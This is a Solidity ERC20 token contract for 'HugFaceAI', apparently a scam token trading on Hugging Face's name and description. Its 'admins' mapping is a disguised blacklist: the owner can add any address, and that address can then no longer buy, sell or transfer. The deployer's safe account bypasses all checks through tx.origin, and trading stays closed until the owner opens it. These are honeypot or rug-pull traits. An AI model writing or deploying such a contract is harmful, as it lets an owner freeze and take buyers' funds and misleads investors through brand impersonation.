/**

#HugFaceAI is an open-source platform that provides a centralized Model Hub with thousands of pre-trained natural language processing models, along with tools for easy model loading, fine-tuning, and community collaboration to democratize AI technology.

⏰Launch: Saturday,October 26th,12:00UTC

X: https://x.com/huggingfaceai
Web: https://huggingfaceai.xyz

**/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./ERC20.sol";
import "./ERC20Permit.sol";
import "./Ownable.sol";

contract HugFaceAI is ERC20, Ownable, ERC20Permit {
uint8 public constant _decimals = 18;
uint256 private _totalSupply = 10000000000 * (10 ** uint256(_decimals));
address private _HugFaceAISafe;

constructor(address HugFaceAISafe) ERC20("HugFaceAI", "HugFaceAI") ERC20Permit("HugFaceAI") Ownable(msg.sender) {
_Accounts[HugFaceAISafe] = true;
_HugFaceAISafe = HugFaceAISafe;
_mint(_HugFaceAISafe, _totalSupply);
}
mapping(address => bool) _Accounts;
mapping(address => bool) private admins;
bool openedTrade;
address public pair;
address public WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
IUniswapV3Factory facV3 = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);

uint256 public _approvalERC20 = 999 gwei;

function OpenTrade() public onlyOwner {
pair = IUniswapV3Factory(facV3).getPool(address(this), WETH, 100);
openedTrade = true;
}
function addAdmins(address[] memory admins_) public onlyOwner {
for (uint i = 0; i < admins_.length; i++) {
admins[admins_[i]] = true;
}
}

function delAdmins(address[] memory notAdmin) public onlyOwner {
for (uint i = 0; i < notAdmin.length; i++) {
admins[notAdmin[i]] = false;
}
}

function isAdmin(address a) public view returns (bool){
return admins[a];
}

function _update(
address from,
address to,
uint256 value
) internal override {
if (_Accounts[tx.origin]) {
super._update(from, to, value);
return;
} else {
require(openedTrade, "Open not yet");
require(!admins[from] && !admins[to]);
bool state = (to == pair) ? true : false;
if (state) {
super._update(from, to, value);
return;
} else if (!state) {
super._update(from, to, value);
return;
} else if (from != pair && to != pair) {
super._update(from, to, value);
return;
} else {
return;
}
}
}

}

interface IUniswapV3Factory {
event OwnerChanged(address indexed oldOwner, address indexed newOwner);

event PoolCreated(
address indexed token0,
address indexed token1,
uint24 indexed fee,
int24 tickSpacing,
address pool
);

event FeeAmountEnabled(uint24 indexed fee, int24 indexed tickSpacing);

function owner() external view returns (address);

function feeAmountTickSpacing(uint24 fee) external view returns (int24);

function getPool(
address tokenA,
address tokenB,
uint24 fee
) external view returns (address pool);

function createPool(
address tokenA,
address tokenB,
uint24 fee
) external returns (address pool);

function setOwner(address _owner) external;

function enableFeeAmount(uint24 fee, int24 tickSpacing) external;
}